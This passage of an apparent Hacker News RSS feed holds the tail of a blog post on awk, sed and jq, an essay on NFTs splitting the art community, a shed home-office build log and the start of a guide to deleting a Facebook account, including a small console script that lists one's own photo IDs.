<p><code>54.147.20.92 - - [26/Jul/2019:20:21:04 -0600] "GET /wordpress HTTP/1.1" 301 241 "-" "Slackbot 1.0 (+https://api.slack.com/robots)"<br>
185.24.234.106 - - [26/Jul/2019:20:20:50 -0600] "GET /wordpress/archives/date/2004/02 HTTP/1.1" 200 87872 "http://www.mooreds.com" "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)"<br>
185.24.234.106 - - [26/Jul/2019:20:20:50 -0600] "GET /wordpress/archives/date/2004/08 HTTP/1.1" 200 81183 "http://www.mooreds.com" "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)"</code></p>
<p>If I want to see only the ip addresses (assuming these are all in a file called logs.txt), I’d run something like:</p>
<p><code>$ awk '{print $1}' logs.txt<br>
54.147.20.92<br>
185.24.234.106<br>
185.24.234.106</code></p>
<p>There’s lots more, but you can see that you’d be able to slice and dice delimited data pretty easily. Here’s a <a href="https://developer.ibm.com/tutorials/l-awk1/">great article which dives in further</a>.</p>
<p><strong>sed</strong></p>
<p>This is another line utility. You can use it for all kinds of things, but I primarily use it to do search and replace on a file. Suppose you had the same log file, but you wanted to anonymize the the ip address and the user agent. Perhaps you’re going to ship them off for long term storage or something. You can easily remove this with a couple of sed commands.</p>
<p><code>$ sed 's/^[^ ]*//' logs.txt |sed 's/"[^"]*"$//'<br>
- - [26/Jul/2019:20:21:04 -0600] "GET /wordpress HTTP/1.1" 301 241 "-"<br>
- - [26/Jul/2019:20:20:50 -0600] "GET /wordpress/archives/date/2004/02 HTTP/1.1" 200 87872 "http://www.mooreds.com"<br>
- - [26/Jul/2019:20:20:50 -0600] "GET /wordpress/archives/date/2004/08 HTTP/1.1" 200 81183 "http://www.mooreds.com"</code></p>
<p>Yes, it looks like line noise, but this is the power of regular expressions. They’re in every language (though with slight variations) and worth learning. sed gives you the power of regular expressions at the command line for processing files. I don’t have a great sed tutorial I’ve found, but googling shows a number.</p>
<p><strong>jq</strong></p>
<p>If you work on the command line with modern software at all, you have encountered json. It’s used for configuration files and data transmission. Sometimes you get an array of json and you just want to pick out certain attributes of it. Tools like sed and awk fail at this, because they are used to newlines separating records, not curly braces and commas. Sure, you could use regular expressions to parse simple json, and there are times when I’ve done this. But a far better tool is <a href="https://stedolan.github.io/jq/">jq</a>. I’m not as savvy with this as with the others, but have used it whenever I’m dealing with an API that delivers json (which is most modern ones). I can pull the API down with <a href="https://curl.haxx.se/">curl</a> (another great tool) and parse it out with jq. I can put these all in a script and have the exploration be repeatable.</p>
<p>I did this a few months&nbsp; ago when I was doing some exploration of an elastic search system. I crafted the queries with curl and then used jq to parse out the results so that I could make some sense of this. Yes, I could have done this with a real programming language, but it would have taken longer. I could also have used a gui tool like postman, but then it would not have been replicable.</p>
<p>sed and awk should be on every system you run across; jq is non standard, but easy to install. It’s worth spending some time getting to know these tools. So next time you are processing a text file and need to extract just a bit of it, reach for sed and awk. Next time you get a hairy json file and you are peering at it, look at jq. I think you’ll be happy with the result.</p>
<p>Sincerely,</p>
<p>Dan</p>
	</div><div>
			<!-- .entry-auhtor -->
		<p><strong>Published</strong>
			<time datetime="2019-07-29T08:41:22-06:00">July 29, 2019</time><time datetime="2020-10-17T15:59:19-06:00">October 17, 2020</time>		</p><!-- .site-posted-on -->
	</div></div>]]>
            </description>
            <link>https://letterstoanewdeveloper.com/2019/07/29/learn-a-little-jq-awk-and-sed/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26370286</guid>
            <pubDate>Sat, 06 Mar 2021 20:29:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[NFTs are tearing the art community apart]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26370175">thread link</a>) | @erjiang
<br/>
March 6, 2021 | https://notes.ericjiang.com/posts/1128 | <a href="https://web.archive.org/web/*/https://notes.ericjiang.com/posts/1128">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Currently, the collision of artists and cryptocurrencies is playing out across Twitter and other platforms, dividing artists who normally praise and support each other into two camps. One camp wants to make money selling their art as NFTs, and the other camp hates the idea.</p>
<figure><div>
<blockquote data-width="500" data-dnt="true"><p lang="en" dir="ltr">Fun to see cryptoart/NFTs bring a class war to the digital art community. I love see artists that have followed each other for years block each other. This is exactly the thing this community needed</p>— RJ Palmer (@arvalis) <a href="https://twitter.com/arvalis/status/1367982561079697408?ref_src=twsrc%5Etfw">March 5, 2021</a></blockquote>
</div></figure>
<p>If you haven’t heard already, NFTs are enjoying increasing popularity alongside the current record-high cryptocurrency values. NFT stands for <strong>Non-Fungible Token</strong> – an atomic digital token that can be traded for cryptocurrency. Many artists are now selling “digital editions” of their artwork as NFTs on special-purpose marketplaces – the buyer can call themselves the owner of a piece of digital art, similar to how one might purchase a limited edition print. Some of these art NFTs have been trading for the equivalent of tens of thousands of dollars, despite granting the buyer no physical copy, no reproduction rights, or anything other than the ability to say, “Yes, I own this token,” and to sell it to someone else.</p>
<p>What’s been particularly divisive is the objection to the shockingly high energy usage of the most popular cryptocurrencies. <a href="https://memoakten.medium.com/the-unreasonable-ecological-cost-of-cryptoart-2221d3eb2053">One estimate</a> puts the energy consumption involved in a single NFT sale at around 340 kWh, equivalent to driving 1,000km in an ICE car. Most of this is due to the proof-of-work algorithm that’s core to Ethereum[1], the blockchain that most of these NFT sales take place on. Essentially, many objectors see making and selling NFTs as something akin to clearcutting rainforests in order to grow crops.</p>
<p>The artists putting their work up as NFTs see this as an opportunity to live the artist’s dream – to produce highly sought-after pieces for which collectors will pay large sums of money. It’s simultaneously an elevation of their value and status, and also their ticket to a life free from the struggle of paying the bills. Is it so easy to pass on what could be a once-in-a-lifetime chance at wealth, even when people are telling you that it’s contributing to environmental harm?</p>
<figure><div>
<blockquote data-width="500" data-dnt="true"><p lang="en" dir="ltr">I want to make tens of thousands of dollars off one piece of art. I want to be wealthy and comfortable off of my artwork. I do wish that art was valued properly without it being a trend or hurting the environment. (There’s a LOT of nuance to this whole thing. I completely</p>— Megan(Available For Work) (@meganroseruiz) <a href="https://twitter.com/meganroseruiz/status/1367986750103064576?ref_src=twsrc%5Etfw">March 5, 2021</a></blockquote>
</div></figure>
<p>The YES NFT camp has a few arguments, including that NFT transactions are not 1:1 correlated with increased energy use[2], and aren’t you eating meat anyways?</p>
<p>The NO NFT camp seems to have been already stressed out by anti-maskers, racial injustice, income inequality, and all the other ills of the world, only to find out that their beloved colleagues are willing to sell out the environment for a chance to make a quick buck. Depending on who you ask, the whole thing smacks of tech-bro[3] greed, a pyramid scheme, or abandoning your morals.</p>
<p>This has caused some heated threads on Twitter around these talking points, and since it doesn’t seem totally fair to air all the drama – Twitter is very public though! – I’ll put my predictions here instead:</p>
<div><div>
<p>The NFT gold rush won’t last forever. Yes, some artists and speculators have made a good chunk of change selling NFTs. But the idea of artists simultaneously having trouble getting $1,000 commission work while selling old JPEGs for tens of thousands of dollars doesn’t add up. The money that’s buying NFTs is either speculators hoping to resell it for more, or people who previously accumulated cryptocurrency and are either reluctant to cash out or are under the <a href="https://en.wikipedia.org/wiki/Endowment_effect">endowment effect</a>. They wouldn’t spend $1,000 on a digital picture, but would happily spend 0.7 ETH ($1,137).</p>
<p>As more NFTs are minted and put up for sale (supply increases) and the cryptocurrency wealth sloshing around settles or hype dies down (demand decreases), I think NFT prices and volume will settle down to lower levels. No artist to my knowledge has become wealthy by selling NFTs yet, but in the future the chances of even paying your bills via NFTs will be very low.</p>
</div></div>
<p>Despite my negative outlook on NFTs, I think they’ll be around in the long run with limited use[4] along the lines of Patreon – if people are willing to pay monthly to support an artist, why not also be the Digital Owner of one of that artist’s works? It’s a way to publicly show your support for your favorite artists.</p>
<p>[1] Ethereum is not scheduled to move to proof-of-stake until some time in 2022. The NFT gold rush may run out of steam by then.</p>
<p>[2] The USD price of a cryptocurrency has a bigger correlation to its mining electricity consumption. The higher the price, the more profitable it is to keep your computer on all night mining cryptocurrency, thus the best way to fight the environmental cost is to crash the USD exchange rate. There’s even a plausible scenario where artists selling their earned ETH to pay their bills puts downward pressure on the USD-ETH rate, reducing ETH’s electricity consumption.</p>
<p>[3] The artists selling NFTs seem to be mostly men, like cryptocurrency enthusiasts who are also mostly men. This is based on my limited non-scientific browsing of NFT marketplaces.</p>
<p>[4] One legitimately interesting use case for NFTs could center around tracking ownership of Original Characters (OCs), for which there already is a thriving market for trading and selling. Basically, the artist draws a cool/fierce/cute/sexy paladin/drow/khajiit/whatever character, and the buyer gets exclusive rights to own that character, use it for role playing, take the included “refsheet” to other artists to commission custom art of said character, or resell the character. It’s all very ad-hoc and exists largely outside the world of copyright law as we know it. The demographic also seems to be teenagers, which might hamper adoption of NFTs.</p>
</div></div>]]>
            </description>
            <link>https://notes.ericjiang.com/posts/1128</link>
            <guid isPermaLink="false">hacker-news-small-sites-26370175</guid>
            <pubDate>Sat, 06 Mar 2021 20:13:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: I Moved into My Home Office/Shed]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 9 (<a href="https://news.ycombinator.com/item?id=26370150">thread link</a>) | @aarondf
<br/>
March 6, 2021 | https://aaronfrancis.com/shedquarters | <a href="https://web.archive.org/web/*/https://aaronfrancis.com/shedquarters">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <div>
                <div>
        
<p><span>This page will be an ever-evolving log of my backyard shedquarters. The last update was February 28th.</span></p>
<p>During 2020 I began working full-time from home in our 2 bedroom house. I completely took over the kitchen table
for a while because I thought the pandemic would only last a few weeks, which was adorable in hindsight. After a
couple of months I moved to the spare bedroom and set up shop in there. Our company has since decided to go
fully remote forever, so I needed a more dedicated space for working</p>
<p>I've always wanted a shedquarters because it seems so fun to build out the perfect workspace, so I decided to
pull the trigger on it sometime in October.</p>
<p>If you want to follow along on Twitter, here's the thread:</p>
<blockquote><p lang="en" dir="ltr">About a month ago, I got a 10x20 shed
        delivered so I could build out a shedquarters office in my backyard. It's been a ton of fun (and
        work) so far! I'm going to share a lot of it on this thread over the next couple of months until it's
        done. (Also at <a href="https://t.co/qAXSKUZdyk">https://t.co/qAXSKUZdyk</a>.)
        <a href="https://t.co/G1MOWBS777">pic.twitter.com/G1MOWBS777</a></p>— Aaron Francis
    (@aarondfrancis) <a href="https://twitter.com/aarondfrancis/status/1333866090573811723?ref_src=twsrc%5Etfw">December
        1, 2020</a></blockquote>

<h2>Build vs Buy</h2>
<p>The first question I had to answer was whether I was going to try to build a shed from the ground up, or buy a
pre-made one. Having never built anything before I thought it might be fun to try something relatively
low-stakes like a shed. I watched a ton of YouTube videos and felt pretty confident I could pull <em>something</em>
off.</p>
<p>However, in the end I decided that it would take <em>way</em> longer than I wanted to build it from the ground up, and
I have a lot of other projects that would suffer if I spent 3 months building a shed. I am so, so glad I decided
to buy a pre-made shell instead.</p>
<h2>Choosing a Builder</h2>
<p>There are lots of fancy options that come totally pre-done and look beautiful (<a href="http://kangaroomsystems.com/">Kanga
Rooms</a> being one of them). Those were way too expensive for my budget, and didn't
leave me quite enough room for customizing to my liking.</p>
<p>Those fancier options are really geared toward "turn-key home offices", while what I wanted was more of "a shed
I can turn into an office".</p>
<p>There are a shed load (get it) of shed manufacturers to choose from, at least here in Texas! The one I settled
on was <a href="https://www.lonestarstructures.com/">Lone Star Structures</a>. Their prices are great, their customer
service is amazing, and they have an online shed designer that lets you build out exactly what you're looking
for. They also delivered and leveled it for me, but more on that later.</p>
<p>Here is a screenshot from my 3D design:</p>
<p><a href="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/render.jpg" target="_blank"><img loading="lazy" src="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/render.jpg"></a></p>
<p><span><em>You can click on any picture to view it full size.</em></span></p>
<p>You can view the actual model here:
<a href="https://shedview.lonestarstructures.com/?lng=en-US#c7aadf9f04f8920f492af4f47b95021d">shedview.lonestarstructures.com/#c7aadf9f04f8920f492af4f47b95021d</a></p>
<h2>Building Size</h2>
<p>I decided to go with a 10x20 building, for two reasons. The first is that we only have about 10 feet of space in
the spot where the shed was going to go, so that limited the width. The second reason is that anything &lt;= 200
square feet does not require a permit.</p>
<p>We had an old shed that was 10 feet wide and 12 feet long, you can see how tight the width is:</p>
<p><a href="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/old-1.jpg" target="_blank"><img loading="lazy" src="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/old-1.jpg"></a></p>
<p><a href="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/old-2.jpg" target="_blank"><img loading="lazy" src="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/old-2.jpg"></a></p>
<p>The only access to our backyard is through a large gate that is just over 11ft wide.</p>
<p><a href="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/gate.jpg" target="_blank"><img loading="lazy" src="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/gate.jpg"></a>
</p>
<p>I have some pictures and videos of the delivery, you'll see just how tight it was even with the 10ft model.</p>
<h2>Floor Plan</h2>
<p>We don't have a garage, so that old shed was serving the purpose of storing "garage stuff", which the new
building would have to do as well. To accomodate both the needs of a new office and "garage stuff", I decided to
split the shed into two sections. A 10x16 space for the office, and a 10x4 space for the garage stuff.</p>
<p>Lone Star Structures has the option to add a 4 foot "loft" in their configuration tool, so I added the loft and
then specifically requested that they build out a wall underneath.</p>
<p>Here's a floor plan overview:</p>
<p><a href="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/floor-plan.jpg" target="_blank"><img loading="lazy" src="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/floor-plan.jpg"></a></p>
<p>And here's what it looks like in real life:</p>
<p><a href="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/loft.jpg" target="_blank"><img loading="lazy" src="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/loft.jpg"></a></p>
<p>The large, double doors open from the yard into the storage area. You can see the stud wall Lone Star built for
me to partition the space. Eventually there will be a proper wall there and the two spaces will be totally
discrete.</p>
<p>Here's a shot from the inside looking out. You can see the "loft" that will be accessible from the office and
give me a bit more air conditioned storage space.</p>
<p><a href="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/pano.jpg" target="_blank"><img loading="lazy" src="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/pano.jpg"></a></p>
<p>The astute reader will now note that when the wall is completed... there will be no way to get into the office!
More on that soon.</p>
<h2>Demolition of the Old Shed</h2>
<p>Before the new shed came, I had to get rid of the old one. I tried for a week or two to <em>give it away</em> on
Craigslist, but that failed hysterically. A couple of people asked if it would fit in their SUV. It's a 10x12
shed that weighs hundreds of pounds!</p>
<p>After being disappointed by Craigslist once again, I decided to borrow a sawzall and demolish it myself. It was
a lot of hard work, but this timelapse makes it look super easy:</p>
<p><iframe loading="lazy" width="600" src="https://www.youtube.com/embed/OxhCjshVRvU?modestbranding=1&amp;rel=0" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<h2>Preparing the Pad for the New Shed</h2>
<p>Since the new shed is 8 feet longer than the old shed was, I needed to make the pad 8 feet longer. Lone Star was
responsible for leveling the shed (which they did a great job of), I just had to provide a pad that was within
12 inches (!) of level.</p>
<p>The old pad was a few inches lower than the surrounding ground, so I wanted it to be a little more uniform.</p>
<p>I started by tilling the ground and then used the broad side of a pick axe to break it up more. I repeated that
process for... ever. Tilling, axing, raking, over and over.</p>
<p>After I got it all level enough, I wanted to compact it down. Since I didn't have a tamper and didn't want to
spend 40 bucks on one I'll never use again, my genius neighbor and I made a pretty janky makeshift tamper out of
a sledgehammer and some boards. It mostly kind of worked!</p>
<p>It also looks hysterical and insane.</p>
<p><a href="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/tamper.jpg" target="_blank"><img loading="lazy" src="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/tamper.jpg"></a>
</p>
<p>Turns out the best tamper is not a sledgehammer attached to some boards, but rather an SUV. Maybe my best idea
so far.</p>
<p><a href="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/suv-tamper.jpg" target="_blank"><img loading="lazy" src="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/suv-tamper.jpg"></a></p>
<p>Again, the timelapse make it look super easy, but it was a lot of work. Please validate me!</p>
<p><iframe loading="lazy" width="600" src="https://www.youtube.com/embed/0p8iIReB9CM?modestbranding=1&amp;rel=0" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<h2>Delivery Day</h2>
<p>The day the shed was delivered I was nervously just waiting around for them to show up. We live on a quiet
residential street that is not super wide, so I was a bit worried that they wouldn't be able to make it down the
street. I was also worried that they wouldn't be able to make it down our driveway, which is also not very wide.</p>
<p>Then a full on 18-wheeler turned the corner and I thought to myself</p>
<p><img src="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/mistake.gif"></p><p>Not only did he have my shed on there, he had another one too! Like it was no big deal!</p>
<p><iframe loading="lazy" width="600" src="https://www.youtube.com/embed/D-bHsgYG2KM?modestbranding=1&amp;rel=0" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<p>This is the face of a concerned person whose neighbors are coming outside to see what the ruckus is.</p>
<p><a href="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/concerned.jpg" target="_blank"><img loading="lazy" src="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/concerned.jpg"></a></p>
<p>And here I am talking to him trying to figure out just exactly what the plan is here, as if I could help.</p>
<p><a href="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/joe-convo.jpg" target="_blank"><img loading="lazy" src="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/joe-convo.jpg"></a></p>
<p>As it turns out, the guy that does this for a living (not me) was less concerned than the average software
developer (me), and apparently it <em>was</em> no big deal because he just tipped the magic trailer back and plopped it
in the street like a boss.</p>
<p><a href="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/shed-unload.jpg" target="_blank"><img loading="lazy" src="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/shed-unload.jpg"></a></p>
<p>The guy (Joe) that drove the shed down the driveway and positioned in place was a wizard with his tiny little
forklift. I have no idea how he did it, because we had only inches to spare.</p>
<p>I'm so pumped for my new shed that I pre-emptively celebrate with a Diet Coke while Joe is toiling away
somewhere actually getting stuff done.</p>
<p><a href="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/celebrating.jpg" target="_blank"><img loading="lazy" src="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/celebrating.jpg"></a></p>
<p>I did have to cut trees back in a few places on both sides of the driveway, so I wasn't <em>totally</em> useless.</p>
<p><a href="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/trees.jpg" target="_blank"><img loading="lazy" src="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/trees.jpg"></a></p>
<p>Here's the whole 1-2 hour process nice and sped up.</p>
<p><iframe loading="lazy" width="600" src="https://www.youtube.com/embed/XKfLARMYZ_o?modestbranding=1&amp;rel=0" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<p>Once it was in place, Joe spent another 30 or 45 minutes getting it all level.</p>
<p><a href="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/leveling.jpg" target="_blank"><img loading="lazy" src="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/leveling.jpg"></a></p>
<p>And now I have a shed! Monster is concerned that it may be too much house for him to handle, I haven't broken
the news that it's not actually for him.</p>
<p><a href="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/monster-1.jpg" target="_blank"><img loading="lazy" src="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/monster-1.jpg"></a></p>
<h2>Adding a French Door</h2>
<p>Because I'm going to be having two separate partitions in the building with a wall in between, I'll need a way
to access the office. The doors that are already present on the shed access the tool/yard storage area.</p>
<p>When I was designing the shed I had the option to add a door and some windows using their online design tool,
but everything they offer is geared towards sheds because... they build sheds. I wanted something that looked
a little nicer since this is going to be my office and take up a large portion of our yard.</p>
<p>One of my friends recommended that I put in french doors that can serve both as an access point and let in a ton
of light. I found a good <a href="http://www.craddocklumber.com/">local lumber company</a> that I bought the door from. I
was able to customize it so that it swings <em>out</em> instead of in, because there isn't a ton of room for an
in-swinging door in the office.</p>
<p>They also delivered it for me. Turns out it's very very heavy. And beautiful!</p>
<p><a href="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/door-delivery.jpg" target="_blank"><img loading="lazy" src="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/door-delivery.jpg"></a></p>
<p>For this part of the project I recruited my Dad and my brother-in-law because I knew it was going to be a tough
one to do solo.</p>
<p><a href="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/door-team.jpg" target="_blank"><img loading="lazy" src="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/door-team.jpg"></a></p>
<p>We started by clearing the studs out of the section that the door was going to fit in. The placement was figured
so that I have enough room to put my desk in one corner without it overlapping into the door. We used a combo of
sledgehammer + prybar to get the studs out.</p>
<p>Note that this shed is so small (and has the loft wall), that there is
basically no load carried by this wall, so we could just knock the studs out without worrying. We did of course
frame the door in, but there's just so little to worry about in this regard because of the size of the building.</p>
<p>If you do something like this, don't listen to some guy on the internet, ask someone who actually knows what
they're doing.</p>
<p><a href="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/door-placement.jpg" target="_blank"><img loading="lazy" src="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/door-placement.jpg"></a></p>
<p>Once we got it framed up, we took a sawzall and just started cutting it out! There's no going back from this
point, which was very scary.</p>
<p><a href="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/door-first-cut.jpg" target="_blank"><img loading="lazy" src="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/door-first-cut.jpg"></a></p>
<p><a href="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/door-breakthrough.gif" target="_blank"><img loading="lazy" src="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/door-breakthrough.gif"></a></p>
<p><a href="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/door-cleared.jpg" target="_blank"><img loading="lazy" src="https://d8nrpaglj2m0a.cloudfront.net/244690dc-23ee-4693-9cc0-f9ccc2103350/images/shed/door-cleared.jpg"></a></p>
<p>With the wall gone, it was time to dry fit the door and start getting it installed. This was the first time any
of us had ever installed a french door, so I was pleased that we got it pretty close! I think the rough
opening was bigger than it needed to be, but we added an extra 2x4 and lots of shims and that seemed to make it
fit well enough. <code>¯\_(ツ)_/¯</code></p>
<p>Before we did this part I watched a lot of videos on YouTube, and my neighbor (who is <a href="https://www.micekmade.com/">a …</a></p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://aaronfrancis.com/shedquarters">https://aaronfrancis.com/shedquarters</a></em></p>]]>
            </description>
            <link>https://aaronfrancis.com/shedquarters</link>
            <guid isPermaLink="false">hacker-news-small-sites-26370150</guid>
            <pubDate>Sat, 06 Mar 2021 20:10:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to delete your Facebook account in 2021]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26370079">thread link</a>) | @eclat
<br/>
March 6, 2021 | https://www.santiagomartins.com/social-media/2021/03/06/how-to-delete-your-facebook-account-in-2021.html | <a href="https://web.archive.org/web/*/https://www.santiagomartins.com/social-media/2021/03/06/how-to-delete-your-facebook-account-in-2021.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  



  <div itemprop="articleBody">
    <p>There are several reasons to consider deleting Facebook. A couple good ones are user privacy and psychological impact. First, as a company it has been fairly hostile to user privacy concerns, even when controlling for the fact that as a major platform it attracts more scrutiny than the vast majority of other software companies. Second, as a platform it works a bit like a slot machine, in that it promotes addictive behaviours and keeps you from engaging in deep work.</p>

<p>A few things might keep you from wanting to fully leave, however if you’re reading this in all likelihood you don’t use Facebook to the same extent you once did, considering that their key market is now the less tech-native segment of the baby-boomer generation. Many people have found that they don’t feel like they’re missing out on anything of value after leaving the platform, and I include myself among those that have enjoyed adopting a more minimalist approach to their digital lives.</p>

<p>A relevant concept here is Dunbar’s number - a suggested cognitive limit to the number of people with whom one can maintain stable social relationships - named after British anthropologist Robin Dunbar. That number is 150, however it’s worth bearing in mind that is the upper limit. In reality, most of us never come close to maintaining 150 close relationships at any one time.</p>

<p>Should you want to go ahead with deleting your account, there are a few things worth considering. One of Facebook’s main uses is as a reminder for your friends’ birthdays, so we want to make sure we export its calendar. Another thing we might want to do is a bit of privacy-focused prevention: delete our posts, leave all groups, download and delete our photos, and unlike all of our liked pages. This is in case Facebook’s ghost profiles turn out to be a real practice, and the evidence seems to suggest they are. Ghost profiles are accounts that Facebook creates, with information it contains on people that aren’t signed up to the platform. Finally, we might want to let our contacts know that we’re leaving the platform and ask them to not upload any photos or information about us, should privacy be a concern.</p>

<ol>
  <li>Download all photos</li>
  <li>Download Facebook’s calendar</li>
  <li>Unfriend, unlike, and delete all photos</li>
  <li>Announce departure</li>
</ol>

<hr>

<h2 id="1-download-all-photos">1: Download all photos</h2>

<p>It’s fairly easy to export all of the photos you uploaded by simply using using Facebook’s <a href="https://www.facebook.com/settings?tab=your_facebook_information">download your information tool</a>. It’s less easy to download photos you’ve been tagged in. For this you’ll have to use some external tools, and most likely have to make use of a little programming.</p>

<p>The first and most simple option is using one of these IFTT recipes:</p>
<ul>
  <li><a href="https://ifttt.com/applets/126727p-back-up-photos-you-re-tagged-in-on-facebook-to-an-ios-photos-album">FB to iOS</a></li>
  <li><a href="https://ifttt.com/applets/47704776d-save-photos-you-re-tagged-in-on-facebook-to-a-dropbox-folder">FB to Dropbox</a></li>
</ul>

<p>If for whatever reason you want to use another alternative you can follow <a href="https://matthew-johnston.com/DownloadAllFacebookTaggedPhotos/">this tutorial</a>. Essentially go to your photos page at <a href="https://facebook.com/me/photos">facebook.com/me/photos</a> and  run this JS script in your browser console to get the “FBIDs” of your photos:</p>

<figure><pre><code data-lang="javascript"><span>for</span> <span>(</span><span>link</span> <span>of</span> <span>document</span><span>.</span><span>getElementsByTagName</span><span>(</span><span>'</span><span>a</span><span>'</span><span>))</span> <span>{</span> 
    <span>if</span> <span>(</span><span>!</span><span>link</span><span>.</span><span>href</span><span>.</span><span>includes</span><span>(</span><span>"</span><span>?fbid=</span><span>"</span><span>))</span> <span>continue</span><span>;</span> 
    <span>console</span><span>.</span><span>log</span><span>(</span><span>new</span> <span>URL</span><span>(</span><span>link</span><span>.</span><span>href</span><span>).</span><span>searchParams</span><span>.</span><span>get</span><span>(</span><span>"</span><span>fbid</span><span>"</span><span>));</span> 
    <span>}</span></code></pre></figure>

<p>Then feed that list to <a href="https://github.com/mgjohnston/fmpd/tree/patch-1">this python script</a> which downloads your photos.</p>

<p>I would recommend then hosting your photos on another cloud-hosting provider such as Apple Photos.</p>

<h2 id="2-download-facebooks-calendar">2: Download Facebook’s calendar</h2>
<p>You can use <a href="https://chrome.google.com/webstore/detail/birthday-calendar-extract/imielmggcccenhgncmpjlehemlinhjjo">this Chrome extension</a> for that, it’s quite straightforward.</p>

